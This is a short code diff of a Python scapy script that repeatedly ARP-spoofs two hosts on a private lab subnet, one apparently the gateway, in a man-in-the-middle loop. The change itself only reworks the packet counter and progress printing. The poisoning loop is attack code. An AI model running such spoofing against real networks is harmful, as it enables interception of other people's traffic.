@@ -1,3 +1,4 @@
+import sys
 import time
 import scapy.all as scapy
 
@@ -38,8 +39,9 @@ i = 0
 while keep_looping:
     spoof("192.168.159.133", "192.168.159.2")
     spoof("192.168.159.2", "192.168.159.133")
+    i += 2
+    print(f"\rsending the {i} packets"),
+    sys.stdout.flush()
     time.sleep(2)
-    print(f"sending the {i + 2} packet")
-    i+=2
 
 
